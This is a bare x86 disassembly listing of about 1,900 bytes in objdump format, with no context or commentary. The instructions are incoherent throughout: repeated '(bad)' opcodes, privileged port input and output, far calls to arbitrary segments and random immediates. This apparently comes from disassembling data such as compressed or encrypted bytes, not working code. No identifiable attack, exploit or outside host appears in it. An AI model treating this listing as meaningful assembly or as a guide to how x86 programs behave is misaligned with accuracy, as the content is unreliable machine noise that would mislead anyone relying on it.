  41dc5f:	cld    
  41dc60:	aas    
  41dc61:	(bad)
  41dc64:	xor    eax,0xf6e6080
  41dc69:	(bad)  
  41dc6a:	pop    edx
  41dc6b:	jbe    0x41dbf4
  41dc6d:	jbe    0x41dcd0
  41dc6f:	pop    edx
  41dc70:	xor    ecx,esp
  41dc72:	stos   BYTE PTR es:[edi],al
  41dc73:	into   
  41dc74:	and    BYTE PTR [ecx],bl
  41dc76:	or     esi,DWORD PTR [edi+0x3b925d7]
  41dc7c:	or     al,0x86
  41dc7e:	mov    ebp,0xbc1c05a2
  41dc83:	push   ds
  41dc84:	int    0xca
  41dc86:	adc    al,BYTE PTR [edx+0x7e2d258b]
  41dc8c:	mov    bh,0xf4
  41dc8e:	add    al,0xf
  41dc90:	cmp    al,0x39
  41dc92:	or     al,0x83
  41dc94:	sahf   
  41dc95:	xor    ch,BYTE PTR [ecx+0x13af2abc]
  41dc9b:	mov    bh,BYTE PTR [esi-0x73]
  41dc9e:	daa    
  41dc9f:	in     eax,dx
  41dca0:	out    0xca,eax
  41dca2:	inc    edx
  41dca3:	add    ch,BYTE PTR [eax+0x6f]
  41dca6:	mov    ds:0x90141293,al
  41dcab:	dec    edi
  41dcac:	je     0x41dcd9
  41dcae:	or     BYTE PTR [eax],0xeb
  41dcb1:	mov    edi,0xfd18a50f
  41dcb6:	inc    ebx
  41dcb7:	lahf   
  41dcb8:	in     eax,0xc2
  41dcba:	inc    edi
  41dcbb:	jne    0x41dc54
  41dcbd:	(bad)  
  41dcbe:	clc    
  41dcbf:	in     al,dx
  41dcc0:	fimul  WORD PTR [esi+0x14]
  41dcc3:	push   esi
  41dcc4:	dec    eax
  41dcc5:	ja     0x41dcdf
  41dcc7:	test   BYTE PTR [esi-0x72],ch
  41dcca:	pop    edx
  41dccb:	cmp    BYTE PTR [ebx+0x56],0x68
  41dccf:	sbb    DWORD PTR [ebx],0x50
  41dcd2:	test   DWORD PTR [ebp+0x4],ecx
  41dcd5:	jg     0x41dd3b
  41dcd7:	arpl   WORD PTR [esi],dx
  41dcd9:	repz retf 0x7a7
  41dcdd:	xor    al,0xe0
  41dcdf:	dec    eax
  41dce0:	shl    BYTE PTR [ecx-0x1f023974],cl
  41dce6:	pop    eax
  41dce7:	mov    ah,0xde
  41dce9:	xor    al,0x24
  41dceb:	push   ds
  41dcec:	or     eax,0x41e6548f
  41dcf1:	daa    
  41dcf2:	xor    edx,DWORD PTR [ecx+0x1f]
  41dcf5:	hlt    
  41dcf6:	sbb    DWORD PTR [esi+0x41],ebp
  41dcf9:	xchg   DWORD PTR [ebx-0x4c2b081],ebp
  41dcff:	jno    0x41dcbb
  41dd01:	aad    0x69
  41dd03:	push   esi
  41dd04:	(bad)  
  41dd05:	lods   al,BYTE PTR ds:[esi]
  41dd06:	xor    ebx,edi
  41dd08:	imul   edx,DWORD PTR [esi+0x74],0x4006b71d
  41dd0f:	sbb    al,0x60
  41dd11:	xchg   edi,eax
  41dd12:	and    BYTE PTR [edx+0x5948613],0x10
  41dd19:	xchg   ebx,eax
  41dd1a:	sti    
  41dd1b:	pop    es
  41dd1c:	sbb    BYTE PTR [edx],0xb5
  41dd1f:	xor    BYTE PTR [eax+0x1ca5c3e8],ch
  41dd25:	adc    DWORD PTR [ebx],0xb5c9101f
  41dd2b:	push   edi
  41dd2c:	sub    DWORD PTR [ebx+ecx*2+0x66],edx
  41dd30:	mov    al,0x75
  41dd32:	xchg   edx,eax
  41dd33:	les    edi,FWORD PTR [eax]
  41dd35:	test   DWORD PTR [esi+0x7d],edx
  41dd38:	xor    al,0xfb
  41dd3a:	bt     DWORD PTR [ecx+0x97af297],esp
  41dd41:	jo     0x41dd88
  41dd43:	cmp    bh,0x5c
  41dd46:	int    0x5e
  41dd48:	(bad)  
  41dd49:	out    0xc4,eax
  41dd4b:	call   0x83595ee
  41dd50:	pop    ds
  41dd51:	mov    DWORD PTR [ebx-0x1ab6778],edx
  41dd57:	jns    0x41dd1e
  41dd59:	gs add eax,0x46b35bf8
  41dd5f:	xor    eax,0x6e8cb2be
  41dd64:	mov    ebx,0xe81b6a6a
  41dd69:	push   ds
  41dd6a:	mov    edi,0xfee45a2f
  41dd6f:	xchg   ebp,eax
  41dd70:	dec    ecx
  41dd72:	inc    edi
  41dd73:	adc    ebx,DWORD PTR [eax]
  41dd75:	dec    esi
  41dd76:	push   ebp
  41dd77:	scas   al,BYTE PTR es:[edi]
  41dd78:	dec    esp
  41dd79:	jo     0x41dcfb
  41dd7b:	push   ebp
  41dd7c:	mov    ebp,0xfcedbd04
  41dd81:	push   0x9053201d
  41dd86:	pop    esp
  41dd87:	push   esi
  41dd88:	mov    ch,0xc2
  41dd8a:	aam    0x5
  41dd8c:	or     al,0xe8
  41dd8e:	push   ebp
  41dd8f:	icebp  
  41dd90:	jns    0x41dd69
  41dd92:	fwait
  41dd93:	rol    DWORD PTR [ecx+0x70],0xd6
  41dd97:	std    
  41dd98:	je     0x41dd25
  41dd9a:	bound  ecx,QWORD PTR [eax+0x4]
  41dd9d:	mov    esi,0x88c5d553
  41dda2:	fisubr DWORD PTR [ecx-0x54fec693]
  41dda8:	scas   eax,DWORD PTR es:[edi]
  41dda9:	outs   dx,BYTE PTR ds:[esi]
  41ddaa:	call   0x93aa17e8
  41ddaf:	sbb    ch,ch
  41ddb1:	mov    dl,BYTE PTR [esi-0x540d0260]
  41ddb7:	adc    al,0x75
  41ddb9:	cmp    ecx,DWORD PTR [ebp-0x1c]
  41ddbc:	mov    bh,0xed
  41ddbe:	aam    0x74
  41ddc0:	repnz fs addr16 mov ebp,esp
  41ddc5:	fwait
  41ddc6:	jp     0x41dd9a
  41ddc8:	sbb    eax,0x36fe5fce
  41ddcd:	inc    esi
  41ddce:	outs   dx,DWORD PTR ds:[esi]
  41ddcf:	xchg   cl,bh
  41ddd1:	outs   dx,DWORD PTR ds:[esi]
  41ddd2:	xor    DWORD PTR [ebx],ebx
  41ddd4:	xor    al,BYTE PTR [eax+0x4764990c]
  41ddda:	jo     0x41de45
  41dddc:	mov    al,cl
  41ddde:	xchg   esi,eax
  41dddf:	cdq    
  41dde0:	pop    ds
  41dde1:	mov    dl,0xdf
  41dde3:	pop    ebx
  41dde4:	cs push ebp
  41dde6:	mov    cl,0xd5
  41dde8:	mov    dl,0xb9
  41ddea:	push   es
  41ddeb:	pop    ebp
  41ddec:	push   ds
  41dded:	mov    ds:0x47b81a69,eax
  41ddf2:	dec    ecx
  41ddf3:	aad    0xf8
  41ddf5:	call   0x8860:0x8acf7dcb
  41ddfc:	lahf   
  41ddfd:	in     eax,dx
  41ddfe:	inc    eax
  41ddff:	popa   
  41de00:	out    0x6c,eax
  41de02:	clc    
  41de03:	pop    esi
  41de04:	pop    ebx
  41de05:	mov    esi,?
  41de07:	out    dx,al
  41de08:	mov    dh,0xc6
  41de0a:	fadd   DWORD PTR [esi]
  41de0c:	mov    eax,ds:0x15a0525e
  41de11:	(bad)  
  41de12:	adc    bl,dh
  41de14:	cwde   
  41de15:	daa    
  41de16:	mov    cl,0xe7
  41de18:	jnp    0x41de50
  41de1a:	mov    esi,DWORD PTR [ecx-0x79]
  41de1d:	int    0xbb
  41de1f:	dec    eax
  41de20:	push   edi
  41de21:	lahf   
  41de22:	jecxz  0x41de75
  41de24:	xchg   edi,eax
  41de25:	cmc    
  41de26:	imul   eax,DWORD PTR [ebp-0x18512c0a],0x69463a40
  41de30:	aad    0x1
  41de32:	push   edx
  41de33:	in     al,0xf6
  41de35:	inc    ebx
  41de36:	inc    ecx
  41de37:	sub    al,BYTE PTR [ecx+esi*4-0x50ec9571]
  41de3e:	xlat   BYTE PTR ds:[ebx]
  41de3f:	pop    edx
  41de40:	outs   dx,DWORD PTR ds:[esi]
  41de41:	fadd   QWORD PTR [ebp+0x5]
  41de44:	test   DWORD PTR [edx-0x6538be94],esp
  41de4a:	or     al,0x2c
  41de4c:	repnz nop
  41de4e:	jae    0x41dec2
  41de50:	or     al,0x68
  41de52:	xchg   esp,eax
  41de53:	(bad)  
  41de54:	popa   
  41de55:	cmp    edx,esi
  41de57:	cmp    BYTE PTR [eax-0x40e1db43],al
  41de5d:	mov    edx,0x1c6a1f9b
  41de62:	xchg   ebp,eax
  41de63:	sub    al,0x3d
  41de65:	stc    
  41de66:	or     BYTE PTR [eax],cl
  41de68:	pusha  
  41de69:	push   0x7b399fe8
  41de6e:	pop    eax
  41de6f:	add    al,0x4
  41de71:	icebp  
  41de72:	adc    ebp,eax
  41de74:	push   cs
  41de75:	pop    ss
  41de76:	inc    edi
  41de77:	jne    0x41de53
  41de79:	dec    ebp
  41de7a:	cmp    esp,edi
  41de7c:	sbb    eax,DWORD PTR [ebp-0x23]
  41de7f:	out    0xd1,al
  41de81:	pop    ss
  41de82:	sbb    DWORD PTR [eax-0xa574a40],esi
  41de88:	ss cdq 
  41de8a:	pop    ebp
  41de8b:	cld    
  41de8c:	in     eax,0x4c
  41de8e:	js     0x41dee5
  41de90:	std    
  41de91:	jle    0x41def1
  41de93:	test   al,0xba
  41de95:	rol    BYTE PTR [ebx-0x73],0xdd
  41de99:	int    0x6
  41de9b:	ret    0x1a05
  41de9e:	dec    esi
  41de9f:	bound  edi,QWORD PTR [edx-0x5a]
  41dea2:	jae    0x41df1f
  41dea4:	push   ds
  41dea5:	loope  0x41de39
  41dea7:	mov    BYTE PTR [eax+0x21],0x93
  41deab:	dec    ebp
  41deac:	sar    DWORD PTR [ebx],cl
  41deae:	lods   eax,DWORD PTR ds:[esi]
  41deaf:	xchg   BYTE PTR [esi+edi*2-0x10134e5d],cl
  41deb6:	addr16 xchg ebx,eax
  41deb8:	fmul   DWORD PTR [ebx]
  41deba:	out    dx,al
  41debb:	les    eax,FWORD PTR [ebp-0x57]
  41debe:	add    eax,esp
  41dec0:	js     0x41deb1
  41dec2:	rcl    DWORD PTR [esi+0x6f],1
  41dec5:	sar    DWORD PTR [esi-0x6c176511],cl
  41decb:	retf   0x6bea
  41dece:	xchg   DWORD PTR [eax+0x3b593e69],eax
  41ded4:	leave  
  41ded5:	sahf   
  41ded6:	and    bh,BYTE PTR [eax-0x7afebb8b]
  41dedc:	inc    eax
  41dedd:	mov    esp,0x81956328
  41dee2:	fistp  DWORD PTR [ebp+0x31029ea5]
  41dee8:	and    DWORD PTR [edi],edx
  41deea:	(bad)  [edx+0x4b]
  41deed:	sub    al,0xa
  41deef:	mov    bl,0xe6
  41def1:	and    eax,0x26e7f3d1
  41def6:	xchg   BYTE PTR [edi+eiz*2-0x7e],cl
  41defa:	call   0x8362:0x4c6d9af2
  41df01:	pop    ebx
  41df02:	xor    dh,dh
  41df04:	sbb    ch,BYTE PTR [edi+0x11]
  41df07:	sbb    DWORD PTR [ebp-0x73],ebx
  41df0a:	and    al,0xb2
  41df0c:	int3   
  41df0d:	enter  0x77ec,0x19
  41df11:	or     eax,0xd3addd75
  41df16:	xchg   edi,eax
  41df17:	inc    edx
  41df18:	xchg   BYTE PTR [esp+ecx*8+0x7d],ch
  41df1c:	rol    ebp,0x3b
  41df1f:	jo     0x41df53
  41df21:	out    dx,eax
  41df22:	inc    ebp
  41df23:	dec    edi
  41df24:	addr16 fs inc esp
  41df27:	pusha  
  41df28:	nop
  41df29:	bound  esp,QWORD PTR [edx+0x74ff4e48]
  41df2f:	mov    dl,0xb8
  41df31:	xchg   esp,eax
  41df32:	call   0xf9b3cda7
  41df37:	or     eax,0xfb9d4103
  41df3c:	mov    ecx,0x2656d64b
  41df41:	add    eax,0x1a854f4a
  41df46:	push   ss
  41df47:	push   esp
  41df48:	(bad)  
  41df49:	cld    
  41df4a:	adc    esi,DWORD PTR [ebp+0x4e38eb2a]
  41df50:	or     eax,0x37f524
  41df55:	and    DWORD PTR [ebp+0x6639e1fd],edi
  41df5b:	dec    edx
  41df5c:	addr16 repnz mov ebx,0x13a5ccd
  41df63:	sub    eax,0x30df8ba
  41df68:	clc    
  41df69:	and    eax,DWORD PTR [edi+0x10]
  41df6c:	les    eax,FWORD PTR [edx-0x7f]
  41df6f:	sbb    BYTE PTR [ecx],cl
  41df71:	lea    ebx,[ecx-0x4ab0b35e]
  41df77:	cld    
  41df78:	adc    al,0xa4
  41df7a:	call   0x3dad:0x6d52b731
  41df81:	lahf   
  41df82:	ja     0x41dfb5
  41df84:	call   0xff09cd78
  41df89:	jge    0x41dfd1
  41df8b:	sbb    dl,BYTE PTR ds:0x3974c5ed
  41df91:	sbb    eax,0x794f07e3
  41df96:	jge    0x41df37
  41df98:	jl     0x41df2c
  41df9a:	call   0xc0c2:0xb5334828
  41dfa1:	pop    bp
  41dfa3:	dec    edi
  41dfa4:	xor    esp,DWORD PTR [esi+0x7]
  41dfa7:	addr16 jmp 0xaad4:0x1147c6b4
  41dfaf:	xchg   DWORD PTR [eax+0x5d],edx
  41dfb2:	(bad)  
  41dfb3:	adc    esp,DWORD PTR [edi+0x5f]
  41dfb6:	popa   
  41dfb7:	(bad)  
  41dfb8:	xor    eax,0x1ad4f788
  41dfbd:	(bad)  
  41dfbe:	push   esi
  41dfbf:	stos   DWORD PTR es:[edi],eax
  41dfc0:	jo     0x41e028
  41dfc2:	xlat   BYTE PTR ds:[ebx]
  41dfc3:	cmp    al,0x48
  41dfc5:	sub    DWORD PTR [edx+0x43],0xd5a9eb8a
  41dfcc:	das    
  41dfcd:	mov    cl,0x40
  41dfcf:	mov    dh,0x56
  41dfd1:	pop    edi
  41dfd2:	stos   BYTE PTR es:[edi],al
  41dfd3:	jae    0x41e042
  41dfd5:	js     0x41dfff
  41dfd7:	pop    es
  41dfd8:	call   0x2a4b:0xbc295066
  41dfdf:	mov    dh,0xde
  41dfe1:	daa    
  41dfe2:	aad    0xb9
  41dfe4:	leave  
  41dfe5:	mov    ds:0xd5fd5dca,al
  41dfea:	test   eax,0x65cdec1f
  41dfef:	xor    al,0xc5
  41dff1:	mov    dh,BYTE PTR [ebp+0x6aa4752b]
  41dff7:	jg     0x41e042
  41dff9:	adc    al,0x65
  41dffb:	adc    eax,0xaf474b3b
  41e000:	gs inc edi
  41e002:	pop    es
  41e003:	mov    ebp,0x87419f8
  41e008:	mov    ebx,0x654e374
  41e00d:	pushf  
  41e00e:	cmc    
  41e00f:	lahf   
  41e010:	pop    esp
  41e011:	xchg   DWORD PTR [ecx],ecx
  41e013:	push   ds
  41e014:	xchg   esp,eax
  41e015:	aam    0x9c
  41e017:	mov    al,0x25
  41e019:	aam    0x8e
  41e01b:	mov    ah,0xe4
  41e01d:	iret   
  41e01e:	pop    ebp
  41e01f:	mov    DWORD PTR [ebx],edi
  41e021:	and    ebx,DWORD PTR [ecx]
  41e023:	mov    bl,0xa9
  41e025:	and    BYTE PTR [esi+0x69c17a1e],al
  41e02b:	out    0x39,al
  41e02d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e02e:	inc    ebp
  41e02f:	pop    eax
  41e030:	add    BYTE PTR [esi],al
  41e032:	sbb    al,0x7c
  41e034:	adc    edx,edi
  41e036:	xchg   BYTE PTR [edx+0x23],bl
  41e039:	loope  0x41dfc2
  41e03b:	lea    esp,[esi]
  41e03d:	mov    ds:0xe83cc4a9,eax
  41e042:	jl     0x41e07f
  41e044:	sbb    DWORD PTR [edx-0xecd3920],0x2722fe7
  41e04e:	jno    0x41e08a
  41e050:	outs   dx,DWORD PTR ds:[esi]
  41e051:	cmp    DWORD PTR [ecx-0x7b],eax
  41e054:	std    
  41e055:	call   0xcc33:0x1a5f8d95
  41e05c:	outs   dx,DWORD PTR ds:[esi]
  41e05d:	(bad)
  41e060:	or     esi,DWORD PTR [ebx-0x45]
  41e063:	pop    es
  41e064:	inc    esi
  41e065:	jecxz  0x41e0dd
  41e067:	adc    cl,al
  41e069:	enter  0xe3e6,0xac
  41e06d:	xchg   ecx,eax
  41e06e:	(bad)  
  41e06f:	mov    DWORD PTR [ebx-0x7f2ebfea],edx
  41e075:	jne    0x41e0cb
  41e077:	stos   DWORD PTR es:[edi],eax
  41e078:	sbb    BYTE PTR [eax],dl
  41e07a:	fdivr  QWORD PTR [ebp-0x9179a21]
  41e080:	push   ecx
  41e081:	jno    0x41e009
  41e083:	xor    eax,DWORD PTR [edi-0x2f967ad7]
  41e089:	fwait
  41e08a:	lods   eax,DWORD PTR ds:[esi]
  41e08b:	push   ebp
  41e08c:	mov    edi,0xb68fea48
  41e091:	or     bh,BYTE PTR [ecx+0x5a524cb4]
  41e097:	xchg   esi,eax
  41e098:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  41e09a:	sub    bl,cl
  41e09c:	jmp    0x41e09a
  41e09e:	shl    DWORD PTR [ecx-0x66694bac],cl
  41e0a4:	xchg   edi,eax
  41e0a5:	inc    ebx
  41e0a6:	aas    
  41e0a7:	pop    ecx
  41e0a9:	rcl    DWORD PTR [edx],0xd5
  41e0ac:	ret    
  41e0ad:	mov    ebp,0x6255fd25
  41e0b2:	inc    ebp
  41e0b3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e0b4:	(bad)  
  41e0b6:	retf   
  41e0b7:	pop    esi
  41e0b9:	test   al,0xca
  41e0bb:	cmp    al,0x2f
  41e0bd:	mov    edi,0xe3271d8d
  41e0c2:	jecxz  0x41e06d
  41e0c4:	jnp    0x41e0ec
  41e0c6:	adc    ebx,DWORD PTR [eax-0x7da8ee31]
  41e0cc:	and    DWORD PTR [ecx],eax
  41e0ce:	or     al,0xab
  41e0d0:	dec    ebx
  41e0d1:	xchg   ebp,eax
  41e0d2:	lahf   
  41e0d3:	add    dl,0xab
  41e0d6:	ins    DWORD PTR es:[edi],dx
  41e0d7:	xor    DWORD PTR [edx+eiz*4-0x52f1c203],0x5b
  41e0df:	and    bl,BYTE PTR [ebp+0x6e82b21b]
  41e0e5:	out    dx,eax
  41e0e6:	adc    dl,BYTE PTR [eax-0x2409a0ce]
  41e0ec:	jno    0x41e08e
  41e0ee:	mov    ecx,0x175c
  41e0f3:	es inc edi
  41e0f5:	sub    BYTE PTR [edi-0x6098c1ca],dl
  41e0fb:	ins    DWORD PTR es:[edi],dx
  41e0fc:	jp     0x41e083
  41e0fe:	cs in  al,0xe
  41e101:	sbb    eax,0xe99d3ace
  41e106:	xor    DWORD PTR [edi-0x2954a6a3],esp
  41e10c:	bound  ebx,QWORD PTR [edx+0x26dbc887]
  41e112:	sbb    cl,ah
  41e114:	cdq    
  41e115:	mov    ebp,0x80a86364
  41e11a:	or     eax,0xe4ad2272
  41e11f:	push   0x63507079
  41e124:	pop    ecx
  41e125:	mov    es,esi
  41e127:	push   esi
  41e128:	loopne 0x41e17e
  41e12a:	mov    eax,DWORD PTR [esi+0x237f6205]
  41e130:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e131:	pop    eax
  41e132:	and    esp,DWORD PTR [eax+0x279404df]
  41e138:	dec    edi
  41e139:	cwde   
  41e13a:	jecxz  0x41e0c1
  41e13c:	mov    al,0xfc
  41e13e:	sub    al,0xd3
  41e140:	inc    edi
  41e141:	(bad)  
  41e142:	stos   BYTE PTR es:[edi],al
  41e143:	push   0x4b
  41e145:	fs or  al,0xaf
  41e148:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e149:	es stc 
  41e14b:	add    al,0x3c
  41e14d:	or     esp,DWORD PTR [edx]
  41e14f:	sti    
  41e150:	cli    
  41e151:	es push ebp
  41e153:	sti    
  41e154:	pop    esi
  41e155:	(bad)  
  41e157:	rcr    BYTE PTR [edx-0x45b322dc],0xeb
  41e15e:	inc    esp
  41e15f:	mov    edx,0x2244c7f0
  41e164:	inc    ecx
  41e165:	lods   al,BYTE PTR ds:[esi]
  41e166:	mov    esi,0x2d22ee2d
  41e16b:	cs xor eax,0xe339204a
  41e171:	gs mov ebp,0xbaffeebe
  41e177:	into   
  41e178:	hlt    
  41e179:	retf   
  41e17a:	gs jle 0x41e1db
  41e17d:	aaa    
  41e17e:	cmp    eax,DWORD PTR [ecx+0x62]
  41e181:	cld    
  41e182:	imul   ah
  41e184:	dec    eax
  41e185:	xchg   esi,eax
  41e186:	cmc    
  41e187:	es jle 0x41e10d
  41e18a:	sub    BYTE PTR [eax-0x1f462453],bl
  41e190:	scas   al,BYTE PTR es:[edi]
  41e191:	int    0x6f
  41e193:	jmp    0x8b8e:0x652a42b5
  41e19a:	mov    cl,0x99
  41e19c:	fst    QWORD PTR [ebx-0x7db66141]
  41e1a2:	out    dx,eax
  41e1a3:	ins    DWORD PTR es:[edi],dx
  41e1a4:	jp     0x41e1b4
  41e1a6:	mov    eax,ds:0x740811b1
  41e1ab:	fdivr  DWORD PTR [edx-0x2e0ece33]
  41e1b1:	test   ebp,edx
  41e1b3:	fwait
  41e1b4:	mov    eax,0x69c8798f
  41e1b9:	push   esp
  41e1ba:	sbb    bl,BYTE PTR [ecx+edi*2]
  41e1bd:	mov    edi,0xd34b1dec
  41e1c2:	sub    ebx,DWORD PTR [eax]
  41e1c4:	nop
  41e1c5:	adc    ah,BYTE PTR [edx+ebp*2-0x2f]
  41e1c9:	or     esi,ecx
  41e1cb:	jl     0x41e16c
  41e1cd:	das    
  41e1ce:	xor    dh,cl
  41e1d0:	push   edx
  41e1d1:	inc    esp
  41e1d2:	mov    WORD PTR [ecx],es
  41e1d4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e1d5:	test   BYTE PTR ds:[edx],bh
  41e1d8:	shl    DWORD PTR [ebx+0x5737e3eb],1
  41e1de:	out    0x3d,eax
  41e1e0:	pop    ecx
  41e1e1:	cdq    
  41e1e2:	test   BYTE PTR [edi+0x64f1f334],cl
  41e1e8:	pop    esi
  41e1e9:	test   DWORD PTR [edx-0x3eb271d6],ebx
  41e1ef:	mov    bh,bl
  41e1f1:	scas   eax,DWORD PTR es:[edi]
  41e1f2:	pop    ebx
  41e1f3:	retf   
  41e1f4:	jnp    0x41e20d
  41e1f6:	(bad)  
  41e1f7:	test   eax,0xadeef156
  41e1fc:	dec    esi
  41e1fd:	fnstsw ax
  41e1ff:	cmp    bh,BYTE PTR [esi-0x3c]
  41e202:	fsubrp st(2),st
  41e204:	or     al,0x30
  41e206:	retf   0x55f
  41e209:	or     dh,BYTE PTR [edx]
  41e20b:	je     0x41e24d
  41e20d:	mov    dh,0x28
  41e20f:	inc    esp
  41e210:	jge    0x41e1e3
  41e212:	xor    BYTE PTR [ebx],dh
  41e214:	adc    dh,BYTE PTR [ebx+edx*2]
  41e217:	adc    DWORD PTR [edi],ebp
  41e219:	outs   dx,DWORD PTR ds:[esi]
  41e21a:	mov    cl,0x31
  41e21c:	jge    0x41e242
  41e21e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e21f:	cs mov dh,0xaf
  41e222:	aaa    
  41e223:	mov    ds:0x6019b74a,al
  41e228:	xor    DWORD PTR [ebx],ebx
  41e22a:	add    eax,0x69e25295
  41e22f:	arpl   WORD PTR [edi+0x5c045801],bp
  41e235:	loopne 0x41e239
  41e237:	push   cs
  41e238:	je     0x41e218
  41e23a:	jge    0x41e258
  41e23c:	das    
  41e23d:	in     al,dx
  41e23e:	adc    DWORD PTR [esi],0x22e93e33
  41e244:	fist   DWORD PTR [eiz*2-0x386cd759]
  41e24b:	jns    0x41e241
  41e24d:	out    0xbb,eax
  41e24f:	aam    0xa6
  41e251:	in     al,dx
  41e252:	rcr    DWORD PTR [edi-0x4d],0x2c
  41e256:	int3   
  41e257:	aam    0xd9
  41e259:	or     DWORD PTR [edx],esi
  41e25b:	mov    ebx,0x7c679077
  41e260:	mov    esp,DWORD PTR [ecx]
  41e262:	pop    eax
  41e263:	aam    0x20
  41e265:	hlt    
  41e266:	and    bl,dh
  41e268:	jmp    0x41e221
  41e26a:	add    DWORD PTR [eax+edi*2+0x3aa7349a],ebx
  41e271:	ret    
  41e272:	jge    0x41e263
  41e274:	jmp    0x622166cb
  41e279:	(bad)  
  41e27a:	addr16 out dx,al
  41e27c:	fnstenv [edi+0x13]
  41e27f:	in     eax,dx
  41e280:	xlat   BYTE PTR ds:[ebx]
  41e281:	ret    0x6c03
  41e284:	cmp    DWORD PTR [ebx+eax*1],esp
  41e287:	in     al,0x51
  41e289:	mov    edx,0x6209aca
  41e28e:	jmp    0x41e2a3
  41e290:	fld    QWORD PTR [ecx+0x73a73f73]
  41e296:	int3   
  41e297:	dec    ecx
  41e298:	aas    
  41e299:	ficomp WORD PTR [ecx]
  41e29b:	cli    
  41e29c:	scas   al,BYTE PTR es:[edi]
  41e29d:	jae    0x41e272
  41e29f:	xchg   edx,eax
  41e2a0:	jne    0x41e256
  41e2a2:	fnstenv [ebx+eiz*1+0x2b]
  41e2a6:	cli    
  41e2a7:	cmp    edx,DWORD PTR gs:[edi+0x3596dd50]
  41e2ae:	popf   
  41e2af:	fidivr DWORD PTR [eax+edi*4-0x599607c9]
  41e2b6:	dec    esp
  41e2b7:	arpl   WORD PTR [ebx],sp
  41e2b9:	jnp    0x41e309
  41e2bb:	inc    edx
  41e2bc:	mov    ecx,0xdebd21b1
  41e2c1:	pop    edi
  41e2c2:	jae    0x41e319
  41e2c4:	jb     0x41e2d2
  41e2c6:	js     0x41e342
  41e2c8:	pmuludq mm1,QWORD PTR [edi+0x2b]
  41e2cc:	std    
  41e2cd:	outs   dx,DWORD PTR ds:[esi]
  41e2ce:	fild   DWORD PTR [esp]
  41e2d1:	gs in  eax,dx
  41e2d3:	fwait
  41e2d4:	js     0x41e30c
  41e2d6:	ins    BYTE PTR es:[edi],dx
  41e2d7:	sbb    BYTE PTR [edx+edi*1],bl
  41e2da:	mov    ch,0xdb
  41e2dc:	(bad)  
  41e2dd:	jmp    0xf5d4:0x790e0812
  41e2e4:	and    ah,BYTE PTR ds:0xce38dcf2
  41e2ea:	loop   0x41e273
  41e2ec:	hlt    
  41e2ed:	or     edi,DWORD PTR ds:0xddff6fd8
  41e2f3:	inc    esi
  41e2f4:	cwde   
  41e2f5:	jno    0x41e2e7
  41e2f7:	(bad)  [ebp+0x10]
  41e2fa:	add    eax,0x707fdaa4
  41e2ff:	and    ah,ah
  41e301:	push   0xffffffb0
  41e303:	jae    0x41e2b2
  41e305:	mov    bl,0xe7
  41e307:	add    DWORD PTR [ecx],ecx
  41e309:	xchg   ebp,eax
  41e30a:	aaa    
  41e30b:	mov    esi,0x889747c1
  41e310:	shl    bh,1
  41e312:	dec    esi
  41e313:	cld    
  41e314:	sahf   
  41e315:	(bad)  
  41e316:	iret   
  41e317:	inc    ebx
  41e318:	cmc    
  41e319:	stc    
  41e31a:	sbb    ch,BYTE PTR [edx-0x1ebfc44f]
  41e320:	bound  esp,QWORD PTR [eax]
  41e322:	ror    DWORD PTR [edx-0x42],1
  41e325:	mov    esi,0xed8bbe
  41e32a:	daa    
  41e32b:	mov    ds:0x5cf3a923,al
  41e330:	cli    
  41e331:	sub    al,0x11
  41e333:	sbb    dh,al
  41e335:	push   ss
  41e336:	pusha  
  41e337:	cdq    
  41e338:	sbb    ch,bl
  41e33a:	scas   al,BYTE PTR es:[edi]
  41e33b:	dec    esi
  41e33c:	pop    edx
  41e33d:	xor    cl,BYTE PTR [ebp+0x5e47f017]
  41e343:	mov    ds:0xcac8630b,al
  41e348:	jno    0x41e398
  41e34a:	imul   ebx,DWORD PTR [edi],0xaae01373
  41e350:	popa   
  41e351:	push   esp
  41e352:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e353:	mov    eax,ds
  41e355:	out    dx,al
  41e356:	xchg   BYTE PTR [esi+0x5b507d7b],ch
  41e35c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e35d:	inc    ebx
  41e35e:	push   es
  41e35f:	push   ds
  41e360:	stos   DWORD PTR es:[edi],eax
  41e361:	(bad)  
  41e362:	dec    edi
  41e363:	loope  0x41e39f
  41e365:	clc    
  41e366:	add    eax,0x9d42b0c4
  41e36b:	adc    ebx,DWORD PTR [ecx]
  41e36d:	xchg   edx,eax
  41e36e:	(bad)  
  41e36f:	mov    eax,0x29d8372f
  41e374:	inc    ebp
  41e375:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e376:	adc    al,0x44
  41e378:	fdiv   st(4),st
  41e37a:	ins    BYTE PTR es:[edi],dx
  41e37b:	aas    
  41e37c:	jns    0x41e3ec
  41e37e:	adc    DWORD PTR [eax+0x56013ecd],esp
  41e384:	mov    al,BYTE PTR [ebx]
  41e386:	imul   esp,DWORD PTR ss:[ecx+edx*1],0x23
  41e38b:	out    0x32,eax
  41e38d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e38e:	sub    bl,bh
  41e390:	rol    dl,cl
  41e392:	jmpw   0x8ddf
  41e396:	xchg   ebx,eax
  41e397:	ret    0xdc7b
  41e39a:	mov    al,0xc
  41e39c:	adc    DWORD PTR [ecx+0x2eec761a],edi
  41e3a2:	dec    ebp
  41e3a3:	fisub  DWORD PTR [ecx+0x2c]
  41e3a6:	sbb    edi,esp
  41e3a8:	(bad)
  41e3ab:	jns    0x41e420
  41e3ad:	sar    dh,1
  41e3af:	repnz iret 
  41e3b1:	sbb    bh,ch
  41e3b3:	adc    DWORD PTR [eax+0x1002e05b],ebx
  41e3b9:	jge    0x41e3e9
  41e3bb:	retf   0x5d74
  41e3be:	add    BYTE PTR [eax+0x5],ah
  41e3c1:	cmp    edi,DWORD PTR [ebp+0x22]
  41e3c4:	retf   0x2b3a
  41e3c7:	jno    0x41e41d
  41e3c9:	mov    bl,0xda
  41e3cb:	and    DWORD PTR [esi+0x43],edx
  41e3ce:	scas   al,BYTE PTR es:[edi]
  41e3cf:	or     BYTE PTR [edi+ebp*4],al
  41e3d2:	xchg   ebx,eax
  41e3d3:	mov    ds:0x8638f854,al
